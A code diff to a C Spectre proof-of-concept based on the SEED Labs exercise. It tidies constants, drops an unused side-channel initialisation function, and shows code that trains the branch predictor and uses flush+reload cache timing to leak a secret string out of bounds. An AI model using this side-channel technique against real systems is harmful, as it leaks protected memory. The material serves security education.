@@ -4,15 +4,15 @@
 // Based on the lab material from Seed Labs
 // https://seedsecuritylabs.org/Labs_16.04/System/Spectre_Attack/
 
-#define TRAINING_LOOP_ITERATIONS 100
-#define ATTACK_LOOP_ITERATIONS 1000
-#define IDLE_LOOP_ITERATIONS 10000
+#define TRAINING_LOOP_ITERATIONS (10)           // Should not exceed buffer_size.
+#define ATTACK_LOOP_ITERATIONS (1000)
+#define IDLE_LOOP_ITERATIONS (10000)
 
-#define PAGE_SIZE 4096
-#define ARRAY_LENGTH 256
+#define PAGE_SIZE (4096)
+#define ARRAY_LENGTH (256)
 
 #define CACHE_HIT_THRESHOLD (80)
-#define DELTA 1024
+#define DELTA (1024)
 
 unsigned int buffer_size = 10;                  // Integer containing the size of the dummy array. This is used to initiate the speculative branching in restrictedAccess.
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};     // Probing array. This is used to read values outside the bounds of the array.
@@ -28,9 +28,6 @@ uint8_t restrictedAccess(size_t x)
 
 // Flushes buffer_size from the cache so it has to be requested from memory.
 void flushBufferSize() { _mm_clflush(&buffer_size); }
-
-// Initializes the side channel. (?)
-void initializeSideChannel() { for (int i = 0; i < ARRAY_LENGTH; i++) array[i * PAGE_SIZE + DELTA] = 1; }
 
 // Flushes buffer_size from the cache so it has to be requested from memory.
 void flushSideChannel() { for (int i = 0; i < ARRAY_LENGTH; i++) _mm_clflush(&array[i * PAGE_SIZE +DELTA]); }
@@ -53,7 +50,8 @@ void reloadSideChannel()
     } 
 }
 
-// Performs the attack. Leaves a page from array loaded in cache that can be identified by reloadSideChannel.
+// Performs the attack. 
+// Leaves a page from array loaded in cache that can be identified by reloadSideChannel.
 void spectreAttack(size_t larger_x)
 {
     // Train the CPU to pick the 'true' path in restrictedAccess.
@@ -77,9 +75,6 @@ void spectreAttack(size_t larger_x)
 }
 
 int main() {
-    // Initializes the side channel.   
-    //initializeSideChannel();
-
     for (int j = 0; j < strlen(secret); j++) {
         // The location of the byte we're interested in as an index relative to buffer.
         size_t larger_x = (size_t)(secret - (char*)buffer) + j;
